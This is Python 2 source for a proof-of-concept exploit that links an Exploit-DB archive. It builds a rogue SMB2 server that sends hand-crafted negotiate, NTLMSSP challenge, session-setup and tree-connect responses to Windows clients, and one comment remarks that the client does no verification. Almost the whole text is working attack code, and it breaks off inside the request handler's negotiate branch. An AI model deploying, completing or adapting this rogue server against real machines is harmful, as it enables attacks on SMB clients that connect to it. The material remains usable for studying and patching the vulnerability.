# Full Proof of Concept: 
# https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41222.zip

import sys, struct, SocketServer
from odict import OrderedDict
from datetime import datetime
from calendar import timegm

class Packet():
    fields = OrderedDict([
        ("data", ""),
    ])
    def __init__(self, **kw):
        self.fields = OrderedDict(self.__class__.fields)
        for k,v in kw.items():
            if callable(v):
                self.fields[k] = v(self.fields[k])
            else:
                self.fields[k] = v
    def __str__(self):
        return "".join(map(str, self.fields.values()))

def NTStamp(Time):
    NtStamp = 116444736000000000 + (timegm(Time.timetuple()) * 10000000)
    return struct.pack("Q", NtStamp + (Time.microsecond * 10))

def longueur(payload):
    length = struct.pack(">i", len(''.join(payload)))
    return length

def GrabMessageID(data):
    Messageid = data[28:36]
    return Messageid

def GrabCreditRequested(data):
    CreditsRequested = data[18:20]
    if CreditsRequested == "\x00\x00":
       CreditsRequested =  "\x01\x00"
    else:
       CreditsRequested = data[18:20]
    return CreditsRequested

def GrabCreditCharged(data):
    CreditCharged = data[10:12]
    return CreditCharged

def GrabSessionID(data):
    SessionID = data[44:52]
    return SessionID

##################################################################################
class SMBv2Header(Packet):
    fields = OrderedDict([
        ("Proto",         "\xfe\x53\x4d\x42"),
        ("Len",           "\x40\x00"),
        ("CreditCharge",  "\x00\x00"),
        ("NTStatus",      "\x00\x00\x00\x00"),
        ("Cmd",           "\x00\x00"),
        ("Credits",       "\x01\x00"),
        ("Flags",         "\x01\x00\x00\x00"),
        ("NextCmd",       "\x00\x00\x00\x00"),
        ("MessageId",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("PID",           "\xff\xfe\x00\x00"),
        ("TID",           "\x00\x00\x00\x00"),
        ("SessionID",     "\x00\x00\x00\x00\x00\x00\x00\x00"),
        ("Signature",     "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"),
    ])

##################################################################################
class SMB2NegoAns(Packet):
	fields = OrderedDict([
		("Len",             "\x41\x00"),
		("Signing",         "\x01\x00"),
		("Dialect",         "\xff\x02"),
		("Reserved",        "\x00\x00"),
		("Guid",            "\xea\x85\xab\xf1\xea\xf6\x0c\x4f\x92\x81\x92\x47\x6d\xeb\x72\xa9"),
		("Capabilities",    "\x07\x00\x00\x00"),
		("MaxTransSize",    "\x00\x00\x10\x00"),
		("MaxReadSize",     "\x00\x00\x10\x00"),
		("MaxWriteSize",    "\x00\x00\x10\x00"),
		("SystemTime",      NTStamp(datetime.now())),
		("BootTime",        "\x22\xfb\x80\x01\x40\x09\xd2\x01"),
		("SecBlobOffSet",             "\x80\x00"),
		("SecBlobLen",                "\x78\x00"),
		("Reserved2",                 "\x4d\x53\x53\x50"),
		("InitContextTokenASNId",     "\x60"),
		("InitContextTokenASNLen",    "\x76"),
		("ThisMechASNId",             "\x06"),
		("ThisMechASNLen",            "\x06"),
		("ThisMechASNStr",            "\x2b\x06\x01\x05\x05\x02"),
		("SpNegoTokenASNId",          "\xA0"),
		("SpNegoTokenASNLen",         "\x6c"),
		("NegTokenASNId",             "\x30"),
		("NegTokenASNLen",            "\x6a"),
		("NegTokenTag0ASNId",         "\xA0"),
		("NegTokenTag0ASNLen",        "\x3c"),
		("NegThisMechASNId",          "\x30"),
		("NegThisMechASNLen",         "\x3a"),
		("NegThisMech1ASNId",         "\x06"),
		("NegThisMech1ASNLen",        "\x0a"),
		("NegThisMech1ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x1e"),
		("NegThisMech2ASNId",         "\x06"),
		("NegThisMech2ASNLen",        "\x09"),
		("NegThisMech2ASNStr",        "\x2a\x86\x48\x82\xf7\x12\x01\x02\x02"),
		("NegThisMech3ASNId",         "\x06"),
		("NegThisMech3ASNLen",        "\x09"),
		("NegThisMech3ASNStr",        "\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"),
		("NegThisMech4ASNId",         "\x06"),
		("NegThisMech4ASNLen",        "\x0a"),
		("NegThisMech4ASNStr",        "\x2a\x86\x48\x86\xf7\x12\x01\x02\x02\x03"),
		("NegThisMech5ASNId",         "\x06"),
		("NegThisMech5ASNLen",        "\x0a"),
		("NegThisMech5ASNStr",        "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
		("NegTokenTag3ASNId",         "\xA3"),
		("NegTokenTag3ASNLen",        "\x2a"),
		("NegHintASNId",              "\x30"),
		("NegHintASNLen",             "\x28"),
		("NegHintTag0ASNId",          "\xa0"),
		("NegHintTag0ASNLen",         "\x26"),
		("NegHintFinalASNId",         "\x1b"), 
		("NegHintFinalASNLen",        "\x24"),
		("NegHintFinalASNStr",        "Server2009@SMB3.local"),
		("Data",                      ""),
	])

	def calculate(self):


		StructLen = str(self.fields["Len"])+str(self.fields["Signing"])+str(self.fields["Dialect"])+str(self.fields["Reserved"])+str(self.fields["Guid"])+str(self.fields["Capabilities"])+str(self.fields["MaxTransSize"])+str(self.fields["MaxReadSize"])+str(self.fields["MaxWriteSize"])+str(self.fields["SystemTime"])+str(self.fields["BootTime"])+str(self.fields["SecBlobOffSet"])+str(self.fields["SecBlobLen"])+str(self.fields["Reserved2"])
                 
		SecBlobLen = str(self.fields["InitContextTokenASNId"])+str(self.fields["InitContextTokenASNLen"])+str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])


		AsnLenStart = str(self.fields["ThisMechASNId"])+str(self.fields["ThisMechASNLen"])+str(self.fields["ThisMechASNStr"])+str(self.fields["SpNegoTokenASNId"])+str(self.fields["SpNegoTokenASNLen"])+str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

		AsnLen2 = str(self.fields["NegTokenASNId"])+str(self.fields["NegTokenASNLen"])+str(self.fields["NegTokenTag0ASNId"])+str(self.fields["NegTokenTag0ASNLen"])+str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])+str(self.fields["NegTokenTag3ASNId"])+str(self.fields["NegTokenTag3ASNLen"])+str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

		MechTypeLen = str(self.fields["NegThisMechASNId"])+str(self.fields["NegThisMechASNLen"])+str(self.fields["NegThisMech1ASNId"])+str(self.fields["NegThisMech1ASNLen"])+str(self.fields["NegThisMech1ASNStr"])+str(self.fields["NegThisMech2ASNId"])+str(self.fields["NegThisMech2ASNLen"])+str(self.fields["NegThisMech2ASNStr"])+str(self.fields["NegThisMech3ASNId"])+str(self.fields["NegThisMech3ASNLen"])+str(self.fields["NegThisMech3ASNStr"])+str(self.fields["NegThisMech4ASNId"])+str(self.fields["NegThisMech4ASNLen"])+str(self.fields["NegThisMech4ASNStr"])+str(self.fields["NegThisMech5ASNId"])+str(self.fields["NegThisMech5ASNLen"])+str(self.fields["NegThisMech5ASNStr"])

		Tag3Len = str(self.fields["NegHintASNId"])+str(self.fields["NegHintASNLen"])+str(self.fields["NegHintTag0ASNId"])+str(self.fields["NegHintTag0ASNLen"])+str(self.fields["NegHintFinalASNId"])+str(self.fields["NegHintFinalASNLen"])+str(self.fields["NegHintFinalASNStr"])

                #Sec Blob lens
		self.fields["SecBlobOffSet"] = struct.pack("<h",len(StructLen)+64)
		self.fields["SecBlobLen"] = struct.pack("<h",len(SecBlobLen))
                #ASN Stuff
		self.fields["InitContextTokenASNLen"] = struct.pack("<B", len(SecBlobLen)-2)
		self.fields["ThisMechASNLen"] = struct.pack("<B", len(str(self.fields["ThisMechASNStr"])))
		self.fields["SpNegoTokenASNLen"] = struct.pack("<B", len(AsnLen2))
		self.fields["NegTokenASNLen"] = struct.pack("<B", len(AsnLen2)-2)
		self.fields["NegTokenTag0ASNLen"] = struct.pack("<B", len(MechTypeLen))
		self.fields["NegThisMech1ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech1ASNStr"])))
		self.fields["NegThisMech2ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech2ASNStr"])))
		self.fields["NegThisMech3ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech3ASNStr"])))
		self.fields["NegThisMech4ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech4ASNStr"])))
		self.fields["NegThisMech5ASNLen"] = struct.pack("<B", len(str(self.fields["NegThisMech5ASNStr"])))
		self.fields["NegTokenTag3ASNLen"] = struct.pack("<B", len(Tag3Len))
		self.fields["NegHintASNLen"] = struct.pack("<B", len(Tag3Len)-2)
		self.fields["NegHintTag0ASNLen"] = struct.pack("<B", len(Tag3Len)-4)
		self.fields["NegHintFinalASNLen"] = struct.pack("<B", len(str(self.fields["NegHintFinalASNStr"])))

##################################################################################
class SMB2Session1Data(Packet):
	fields = OrderedDict([
		("Len",             "\x09\x00"),
		("SessionFlag",     "\x01\x00"),
		("SecBlobOffSet",   "\x48\x00"),
		("SecBlobLen",      "\x06\x01"),
		("ChoiceTagASNId",        "\xa1"), 
		("ChoiceTagASNLenOfLen",  "\x82"), 
		("ChoiceTagASNIdLen",     "\x01\x02"),
		("NegTokenTagASNId",      "\x30"),
		("NegTokenTagASNLenOfLen","\x81"),
		("NegTokenTagASNIdLen",   "\xff"),
		("Tag0ASNId",             "\xA0"),
		("Tag0ASNIdLen",          "\x03"),
		("NegoStateASNId",        "\x0A"),
		("NegoStateASNLen",       "\x01"),
		("NegoStateASNValue",     "\x01"),
		("Tag1ASNId",             "\xA1"),
		("Tag1ASNIdLen",          "\x0c"),
		("Tag1ASNId2",            "\x06"),
		("Tag1ASNId2Len",         "\x0A"),
		("Tag1ASNId2Str",         "\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a"),
		("Tag2ASNId",             "\xA2"),
		("Tag2ASNIdLenOfLen",     "\x81"),
		("Tag2ASNIdLen",          "\xE9"),
		("Tag3ASNId",             "\x04"),
		("Tag3ASNIdLenOfLen",     "\x81"),
		("Tag3ASNIdLen",          "\xE6"),
		("NTLMSSPSignature",      "NTLMSSP"),
		("NTLMSSPSignatureNull",  "\x00"),
		("NTLMSSPMessageType",    "\x02\x00\x00\x00"),
		("NTLMSSPNtWorkstationLen","\x1e\x00"),
		("NTLMSSPNtWorkstationMaxLen","\x1e\x00"),
		("NTLMSSPNtWorkstationBuffOffset","\x38\x00\x00\x00"),
		("NTLMSSPNtNegotiateFlags","\x15\x82\x89\xe2"),
		("NTLMSSPNtServerChallenge","\x82\x21\x32\x14\x51\x46\xe2\x83"),
		("NTLMSSPNtReserved","\x00\x00\x00\x00\x00\x00\x00\x00"),
		("NTLMSSPNtTargetInfoLen","\x94\x00"),
		("NTLMSSPNtTargetInfoMaxLen","\x94\x00"),
		("NTLMSSPNtTargetInfoBuffOffset","\x56\x00\x00\x00"),
		("NegTokenInitSeqMechMessageVersionHigh","\x06"),
		("NegTokenInitSeqMechMessageVersionLow","\x03"),
		("NegTokenInitSeqMechMessageVersionBuilt","\x80\x25"),
		("NegTokenInitSeqMechMessageVersionReserved","\x00\x00\x00"),
		("NegTokenInitSeqMechMessageVersionNTLMType","\x0f"),
		("NTLMSSPNtWorkstationName","SMB3"),
		("NTLMSSPNTLMChallengeAVPairsId","\x02\x00"),
		("NTLMSSPNTLMChallengeAVPairsLen","\x0a\x00"),
		("NTLMSSPNTLMChallengeAVPairsUnicodeStr","SMB5"),
		("NTLMSSPNTLMChallengeAVPairs1Id","\x01\x00"),
		("NTLMSSPNTLMChallengeAVPairs1Len","\x1e\x00"),
		("NTLMSSPNTLMChallengeAVPairs1UnicodeStr","WIN-PRH502RQAFV"), 
		("NTLMSSPNTLMChallengeAVPairs2Id","\x04\x00"),
		("NTLMSSPNTLMChallengeAVPairs2Len","\x1e\x00"),
		("NTLMSSPNTLMChallengeAVPairs2UnicodeStr","SMB5.local"), 
		("NTLMSSPNTLMChallengeAVPairs3Id","\x03\x00"),
		("NTLMSSPNTLMChallengeAVPairs3Len","\x1e\x00"),
		("NTLMSSPNTLMChallengeAVPairs3UnicodeStr","WIN-PRH502RQAFV.SMB5.local"),
		("NTLMSSPNTLMChallengeAVPairs5Id","\x05\x00"),
		("NTLMSSPNTLMChallengeAVPairs5Len","\x04\x00"),
		("NTLMSSPNTLMChallengeAVPairs5UnicodeStr","SMB5.local"),
		("NTLMSSPNTLMChallengeAVPairs7Id","\x07\x00"),
		("NTLMSSPNTLMChallengeAVPairs7Len","\x08\x00"),
		("NTLMSSPNTLMChallengeAVPairs7UnicodeStr",NTStamp(datetime.now())),
		("NTLMSSPNTLMChallengeAVPairs6Id","\x00\x00"),
		("NTLMSSPNTLMChallengeAVPairs6Len","\x00\x00"),
	])


	def calculate(self):
		###### Convert strings to Unicode
		self.fields["NTLMSSPNtWorkstationName"] = self.fields["NTLMSSPNtWorkstationName"].encode('utf-16le')
		self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"].encode('utf-16le')
		self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"].encode('utf-16le')
		self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"].encode('utf-16le')
		self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"].encode('utf-16le')
		self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"] = self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"].encode('utf-16le')
                
                #Packet struct calc:
		StructLen = str(self.fields["Len"])+str(self.fields["SessionFlag"])+str(self.fields["SecBlobOffSet"])+str(self.fields["SecBlobLen"])
		###### SecBlobLen Calc:
		CalculateSecBlob = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])+str(self.fields["NTLMSSPNtWorkstationName"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs7Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs7Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs7UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

		AsnLen = str(self.fields["ChoiceTagASNId"])+str(self.fields["ChoiceTagASNLenOfLen"])+str(self.fields["ChoiceTagASNIdLen"])+str(self.fields["NegTokenTagASNId"])+str(self.fields["NegTokenTagASNLenOfLen"])+str(self.fields["NegTokenTagASNIdLen"])+str(self.fields["Tag0ASNId"])+str(self.fields["Tag0ASNIdLen"])+str(self.fields["NegoStateASNId"])+str(self.fields["NegoStateASNLen"])+str(self.fields["NegoStateASNValue"])+str(self.fields["Tag1ASNId"])+str(self.fields["Tag1ASNIdLen"])+str(self.fields["Tag1ASNId2"])+str(self.fields["Tag1ASNId2Len"])+str(self.fields["Tag1ASNId2Str"])+str(self.fields["Tag2ASNId"])+str(self.fields["Tag2ASNIdLenOfLen"])+str(self.fields["Tag2ASNIdLen"])+str(self.fields["Tag3ASNId"])+str(self.fields["Tag3ASNIdLenOfLen"])+str(self.fields["Tag3ASNIdLen"])


                #Packet Struct len
		self.fields["SecBlobLen"] = struct.pack("<H", len(AsnLen+CalculateSecBlob))
                self.fields["SecBlobOffSet"] = struct.pack("<h",len(StructLen)+64)

		###### ASN Stuff
                if len(CalculateSecBlob) > 255:
		   self.fields["Tag3ASNIdLen"] = struct.pack(">H", len(CalculateSecBlob))
                else:
                   self.fields["Tag3ASNIdLenOfLen"] = "\x81"
		   self.fields["Tag3ASNIdLen"] = struct.pack(">B", len(CalculateSecBlob))

                if len(AsnLen+CalculateSecBlob)-3 > 255:
		   self.fields["ChoiceTagASNIdLen"] = struct.pack(">H", len(AsnLen+CalculateSecBlob)-4)
                else:
                   self.fields["ChoiceTagASNLenOfLen"] = "\x81"
		   self.fields["ChoiceTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-3)

                if len(AsnLen+CalculateSecBlob)-7 > 255:
		   self.fields["NegTokenTagASNIdLen"] = struct.pack(">H", len(AsnLen+CalculateSecBlob)-8)
                else:
                   self.fields["NegTokenTagASNLenOfLen"] = "\x81"
		   self.fields["NegTokenTagASNIdLen"] = struct.pack(">B", len(AsnLen+CalculateSecBlob)-7)
                
                tag2length = CalculateSecBlob+str(self.fields["Tag3ASNId"])+str(self.fields["Tag3ASNIdLenOfLen"])+str(self.fields["Tag3ASNIdLen"])

                if len(tag2length) > 255:
		   self.fields["Tag2ASNIdLen"] = struct.pack(">H", len(tag2length))
                else:
                   self.fields["Tag2ASNIdLenOfLen"] = "\x81"
		   self.fields["Tag2ASNIdLen"] = struct.pack(">B", len(tag2length))

		self.fields["Tag1ASNIdLen"] = struct.pack(">B", len(str(self.fields["Tag1ASNId2"])+str(self.fields["Tag1ASNId2Len"])+str(self.fields["Tag1ASNId2Str"])))
		self.fields["Tag1ASNId2Len"] = struct.pack(">B", len(str(self.fields["Tag1ASNId2Str"])))

		###### Workstation Offset
		CalculateOffsetWorkstation = str(self.fields["NTLMSSPSignature"])+str(self.fields["NTLMSSPSignatureNull"])+str(self.fields["NTLMSSPMessageType"])+str(self.fields["NTLMSSPNtWorkstationLen"])+str(self.fields["NTLMSSPNtWorkstationMaxLen"])+str(self.fields["NTLMSSPNtWorkstationBuffOffset"])+str(self.fields["NTLMSSPNtNegotiateFlags"])+str(self.fields["NTLMSSPNtServerChallenge"])+str(self.fields["NTLMSSPNtReserved"])+str(self.fields["NTLMSSPNtTargetInfoLen"])+str(self.fields["NTLMSSPNtTargetInfoMaxLen"])+str(self.fields["NTLMSSPNtTargetInfoBuffOffset"])+str(self.fields["NegTokenInitSeqMechMessageVersionHigh"])+str(self.fields["NegTokenInitSeqMechMessageVersionLow"])+str(self.fields["NegTokenInitSeqMechMessageVersionBuilt"])+str(self.fields["NegTokenInitSeqMechMessageVersionReserved"])+str(self.fields["NegTokenInitSeqMechMessageVersionNTLMType"])

		###### AvPairs Offset
		CalculateLenAvpairs = str(self.fields["NTLMSSPNTLMChallengeAVPairsId"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsLen"])+str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs2Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs3Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs5Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs7Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs7Len"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs7UnicodeStr"])+(self.fields["NTLMSSPNTLMChallengeAVPairs6Id"])+str(self.fields["NTLMSSPNTLMChallengeAVPairs6Len"])

		##### Workstation Offset Calculation:
		self.fields["NTLMSSPNtWorkstationBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation))
		self.fields["NTLMSSPNtWorkstationLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))
		self.fields["NTLMSSPNtWorkstationMaxLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNtWorkstationName"])))

		##### Target Offset Calculation:
		self.fields["NTLMSSPNtTargetInfoBuffOffset"] = struct.pack("<i", len(CalculateOffsetWorkstation+str(self.fields["NTLMSSPNtWorkstationName"])))
		self.fields["NTLMSSPNtTargetInfoLen"] = struct.pack("<h", len(CalculateLenAvpairs))
		self.fields["NTLMSSPNtTargetInfoMaxLen"] = struct.pack("<h", len(CalculateLenAvpairs))
		
		##### IvPair Calculation:
		self.fields["NTLMSSPNTLMChallengeAVPairs7Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs7UnicodeStr"])))
		self.fields["NTLMSSPNTLMChallengeAVPairs5Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs5UnicodeStr"])))
		self.fields["NTLMSSPNTLMChallengeAVPairs3Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs3UnicodeStr"])))
		self.fields["NTLMSSPNTLMChallengeAVPairs2Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs2UnicodeStr"])))
		self.fields["NTLMSSPNTLMChallengeAVPairs1Len"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairs1UnicodeStr"])))
		self.fields["NTLMSSPNTLMChallengeAVPairsLen"] = struct.pack("<h", len(str(self.fields["NTLMSSPNTLMChallengeAVPairsUnicodeStr"])))

class SMB2SessionAcceptData(Packet):
	fields = OrderedDict([
		("Len",                       "\x09\x00"),
		("SessionFlag",               "\x01\x00"),
		("SecBlobOffSet",             "\x48\x00"),
		("SecBlobLen",                "\x1d\x00"),
		("SecBlobTag0",               "\xa1"), 
		("SecBlobTag0Len",            "\x1b"),
		("NegTokenResp",              "\x30"), 
		("NegTokenRespLen",           "\x19"), 
		("NegTokenRespTag0",          "\xa0"), 
		("NegTokenRespTag0Len",       "\x03"), 
		("NegStateResp",              "\x0a"), 
		("NegTokenRespLen1",           "\x01"), 
		("NegTokenRespStr",           "\x00"),
		("SecBlobTag3",               "\xa3"), 
		("SecBlobTag3Len",            "\x12"),
		("SecBlobOctetHeader",        "\x04"), 
		("SecBlobOctetLen",           "\x10"),
		("MechlistMICVersion",        ""),# No verification on the client side...
		("MechlistCheckSum",          ""),
		("MechlistSeqNumber",         ""),
                ("Data",                      ""),
    ])
	def calculate(self):

		###### SecBlobLen Calc:
		CalculateSecBlob = str(self.fields["SecBlobTag0"])+str(self.fields["SecBlobTag0Len"])+str(self.fields["NegTokenResp"])+str(self.fields["NegTokenRespLen"])+str(self.fields["NegTokenRespTag0"])+str(self.fields["NegTokenRespTag0Len"])+str(self.fields["NegStateResp"])+str(self.fields["NegTokenRespLen1"])+str(self.fields["NegTokenRespStr"])+str(self.fields["SecBlobTag3"])+str(self.fields["SecBlobTag3Len"])+str(self.fields["SecBlobOctetHeader"])+str(self.fields["SecBlobOctetLen"])+str(self.fields["MechlistMICVersion"])+str(self.fields["MechlistCheckSum"])+str(self.fields["MechlistSeqNumber"])

		CalculateASN = str(self.fields["NegTokenResp"])+str(self.fields["NegTokenRespLen"])+str(self.fields["NegTokenRespTag0"])+str(self.fields["NegTokenRespTag0Len"])+str(self.fields["NegStateResp"])+str(self.fields["NegTokenRespLen1"])+str(self.fields["NegTokenRespStr"])+str(self.fields["SecBlobTag3"])+str(self.fields["SecBlobTag3Len"])+str(self.fields["SecBlobOctetHeader"])+str(self.fields["SecBlobOctetLen"])+str(self.fields["MechlistMICVersion"])+str(self.fields["MechlistCheckSum"])+str(self.fields["MechlistSeqNumber"])

                MechLen = str(self.fields["SecBlobOctetHeader"])+str(self.fields["SecBlobOctetLen"])+str(self.fields["MechlistMICVersion"])+str(self.fields["MechlistCheckSum"])+str(self.fields["MechlistSeqNumber"])

                #Packet Struct len
		self.fields["SecBlobLen"] = struct.pack("<h",len(CalculateSecBlob))
		self.fields["SecBlobTag0Len"] = struct.pack("<B",len(CalculateASN))
		self.fields["NegTokenRespLen"] = struct.pack("<B", len(CalculateASN)-2)
                self.fields["SecBlobTag3Len"] = struct.pack("<B",len(MechLen))
                self.fields["SecBlobOctetLen"] = struct.pack("<B",len(MechLen)-2)

class SMB2TreeData(Packet):
    fields = OrderedDict([
		("Len",                   "\x10\x00"),
		("ShareType",             "\x02\x00"),
		("ShareFlags",            "\x30\x00\x00\x00"),
		("ShareCapabilities",     "\x00\x00\x00\x00"),
		("AccessMask",            "\xff\x01\x1f\x01"),   
		("Data",                  ""),         
    ])

##########################################################################
class SMB2(SocketServer.BaseRequestHandler):
     
    def handle(self):
        try:
              self.request.settimeout(1)
              print "From:", self.client_address
              data = self.request.recv(1024)

             ##Negotiate proto answer.
              if data[8:10] == "\x72\x00" and data[4:5] == "\xff":
